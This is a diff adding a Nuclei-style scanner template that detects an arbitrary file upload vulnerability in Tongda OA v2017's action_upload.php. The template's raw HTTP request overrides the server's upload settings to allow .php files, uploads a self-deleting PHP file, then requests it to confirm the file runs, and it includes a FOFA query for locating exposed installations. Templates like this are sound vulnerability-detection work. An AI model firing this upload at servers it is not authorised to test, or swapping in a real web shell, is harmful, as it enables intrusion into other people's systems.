@@ -1,0 +1,71 @@
+id: tongda-action-uploadfile
+
+info:
+  name: Tongda OA v2017 action_upload - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Tongda OA v2017 action_upload.php file filtering is insufficient and does not require background permissions, resulting in arbitrary file upload vulnerabilities
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/shadow1ng/fscan/blob/main/WebScan/pocs/tongda-v2017-uploadfile.yml
+  classification:
+    cpe: cpe:2.3:a:tongda2000:office_anywhere_2017:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: tongda2000
+    product: office_anywhere_2017
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,fileupload,intrusive,router
+variables:
+  string: "tongda-action-uploadfile"
+
+http:
+  - raw:
+      - |
+        POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjhddzlqp
+
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+        ffff
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+        1000000000
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+        {{randstr}}
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+        .php
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="ffff"; filename="test.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="mufile"
+
+        submit
+        ------WebKitFormBoundaryjhddzlqp--
+      - |
+        GET {{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100b43bdcee19325e411341d5c94b4709c14c8130c35eeb090f50d712042625a96402200f9088df92a4347e97554746e4dcf6813274ae687a9a6ee1ccdce89eb3bb1d63:922c64590222798bb761d5b6d8e72950
